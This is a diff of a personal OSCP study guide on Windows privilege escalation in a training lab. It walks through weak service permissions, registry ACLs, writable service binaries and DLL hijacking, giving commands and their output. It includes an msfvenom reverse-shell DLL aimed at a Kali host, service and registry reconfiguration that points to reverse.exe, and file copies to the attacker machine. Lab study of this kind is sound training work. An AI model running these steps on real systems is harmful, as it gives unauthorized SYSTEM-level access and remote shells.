@@ -1,12 +1,23 @@
+
 # Windows Privilege Escalation Guide
 I made this guide in preperation for my OSCP exam. It follows [this](https://www.udemy.com/course/windows-privilege-escalation/). The setup for the lab is [here](https://github.com/sagishahar/lpeworkshop).
 This guide will contain more information than my Linux Privilege Escalation guide as Windows security is my weakest area.
 
-A quick note:
+A few quick notes:
 ```
 # - Linux shell
 > - cmd shell
 ps1> - PowerShell... shell....
+```
+
+To copy files from Kali to Windows:
+```cmd
+> copy \\192.168.0.1\tools\file.ext file.ext
+```
+
+To copy files from Windows to Kali:
+```cmd
+> copy file.ext \\192.168.0.1\tools\file.ext
 ```
 ## Introduction
 Our ultimate goal with privilege escalation in Windows is to gain access the the **Administrator** or **SYSTEM** account. 
@@ -31,7 +42,7 @@ In Windows, there are multiple types of resources (also known as objects):
 Whether a user and/or group has permissions to perform a certain action on a resource depends on that resource's access control list (ACL).
 
 Permissions to access a certain resource in Windows are controlled by the access control list (ACL) for that resource. Each ACL is made up of zero or more access control entries (ACEs).
-Eache ACE defines the relationship between a principal (e.g. a user, group) and a certain access right.
+Each ACE defines the relationship between a principal (e.g. a user, group) and a certain access right.
 
 ## Spawning Administrator Shells
 
@@ -108,10 +119,6 @@ Run specific check categories:
 > .\winPEASany.exe quiet cmd systeminfo
 ```
 
-### accesschk.exe
-Old but trustworthy tool for checking user access control rights. You can use it to check whether a user or grup has access to files, directories, services, and registry keys.
-The downside is more recent versions of the program spawn a GUI "accept EULA" popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.
-
 ## Kernel Exploits
 The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the SYSTEM user. 
 
@@ -130,8 +137,10 @@ Beware though, as Kernel exploits can often be unstable and may be one-shot or c
 1. Extract the output of the systeminfo command:
 ```cmd
 > systeminfo > systeminfo.txt
+OR
+> systeminfo > \\192.168.0.1\leet\systeminfo.txt
 ```
-2. Run wesng to find potential exploits:
+2. Run wesng to find potential exploits (you must be in the same directory as your definitions):
 ```bash
 # python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 ```
@@ -182,6 +191,7 @@ Some dangerous (e.g. **SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS**).
 If our user has permissions to change the configurations of a service which runs with SYSTEM privileges, we can change the executable the services uses to one of our own.
 
 **Potential Rabbit Hole:** If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
+
 1. Run winPEAS to check for service misconfigurations
 ```cmd
 > .\winPEASany.exe quiet servicesinfo
@@ -190,15 +200,54 @@ If our user has permissions to change the configurations of a service which runs
 3. We can confirm this with accesschk.exe
 ```cmd
 > .\accesschk.exe /accepteula -uwcqv user daclsvc
+
+RW daclsvc
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_CHANGE_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
 ```
+We can change this service as well as start and stop it
 4. Check the current configuration of the service:
 ```cmd
 > sc qc daclsvc
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: daclsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DACL Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
 ```
+This is a DEMAND_START which means it needs to be started manually. 
+
 5. Check the current status of the service:
 ```cmd
 > sc query daclsvc
+
+SERVICE_NAME: daclsvc 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 1077  (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
 ```
+
+Currently stopped. After config we can start it.
+The easiest way to privilege escalate in this scenario is to configure the BINARY_PATH_NAME back to our reverse.exe and start the service.
+
 6. Reconfigure the service to use our reverse shell executable:
 ```cmd
 > sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
@@ -217,7 +266,7 @@ Consider the following unquoted path:
 ```
 C:\Program Files\Some Dir\SomeProgram.exe
 ```
-To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: "Files\Some" and "Dir\SomeProgram.exe".
+To us, this obviously runs SomeProgram.exe. To Windows, **C:\\Program** could be the executable, with two arguments: **Files\\Some** and **Dir\\SomeProgram.exe**.
 Windows resolves this ambiguity by checking each of the possibilities in turn. 
 If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.
 
@@ -246,3 +295,173 @@ If we can write to a location Windows checks before the actual executable, we ca
 ```
 
 ### Weak Registry Permissions
+The Windows registry stores entries for each service.
+Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly 
+
+1. Run winPEAS to check for service misconfigurations:
+```cmd
+> .\winPEASany.exe quiet servicesinfo
+```
+2. Note that the "regsvc" service has a weak registry entry. We can confirm this with PowerShell
+```powershell
+ps> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
+Owner  : BUILTIN\Administrators
+Group  : NT AUTHORITY\SYSTEM
+Access : Everyone Allow  ReadKey
+         NT AUTHORITY\INTERACTIVE Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+Audit  : 
+Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
+```
+3. Alternatively accesschk.exe can be used to confirm:
+```cmd
+> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        KEY_ALL_ACCESS
+  RW BUILTIN\Administrators
+        KEY_ALL_ACCESS
+  RW NT AUTHORITY\INTERACTIVE
+        KEY_ALL_ACCESS
+```
+
+Not that **NT AUTHORITY\\INTERACTIVE** has full control. This is a sudo group for any user who can log onto the machine locally.
+Verify that we can start/stop the service
+```ps1
+ps> .\accesschk.exe /accepteula -ucqv user regsvc
+
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+
+And check the current values in the registry service entry.
+```ps1
+ps> reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x3
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+    DisplayName    REG_SZ    Insecure Registry Service
+    ObjectName    REG_SZ    LocalSystem
+```
+
+Note that the ImagePath is set to "C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe"
+
+4. Overwrite the ImagePath registry key to point to our reverse shell executable:
+```cmd
+> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+```
+
+5. Start a listener on kali, and trigger the exploit:
+```cmd
+> net start regsvc
+```
+
+### Insecure Service Executables
+If the orignial service executable is modifiable by our user, we can simply replace it with our reverse shell executable. 
+Remember to create a backup of the original executable if you are exploiting this in a real system!
+
+1. Check that an executable is writable using accesschk.exe:
+```cmd
+> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+  RW Everyone
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        FILE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        FILE_ALL_ACCESS
+  RW WIN10-1\campb
+        FILE_ALL_ACCESS
+  RW BUILTIN\Users
+        FILE_ALL_ACCESS
+```
+
+Verify that you can start/stop the service
+```cmd
+.\accesschke.exe /accepteula -uvqc filepermservice.exe
+```
+
+2. Create a backup:
+```cmd 
+> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+```
+
+3. Copy the reverse shell executable to overwrite the service 
+```cmd
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+
+4. Start the listener and start the service
+```cmd
+> net start filepermsvc
+```
+
+### DLL Hijacking
+Often a service will try to load functionality from a library called a DLL (Dynamic-Link Library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it. 
+If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.
+
+A more common misconfiguration that can beused to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searchs for DLLs in.
+Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual. 
+
+1. Use winPEAS to enumerate non-Windows services:
+```cmd
+> .\winPEASany.exe quiet services info
+```
+2. Start by enumerating which of these services our user has stop and start access to:
+```cmd
+> accesschk.exe /accepteula -uvqc user dllsvc
+R  dllsvc
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+3. The "dllsvc" service is vulnerable to DLL hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:
+```cmd
+> sc qc dllsvc
+
+SERVICE_NAME: dllsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DLL Hijack Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+Note the BINARY_PATH_NAME and the SERVICE_START_NAME. 
+4. Run Procmon64.exe wiht administrator privileges. Stop capture and clear logs. Press Ctrl+L to open the filter menu
+5. Add a new filter on the Process Name matching dllhijackservice.exe
+6. On the main screen, deselect registry activity and network activity
+7. Start the service:
+```cmd
+> net start dllsvc
+```
+8. Back in Procmon, note that a number of "NAME NOT FOUND" errors appear in Result, associted with the hijackme.dll file
+9. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writeable by our user.
+10. On Kali, generate a reverse shell DLL named hijackme.dll:
+```bash
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
+```
+11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit
+```cmd
+> net stop dllsvc
+> net start dllsvc
+```
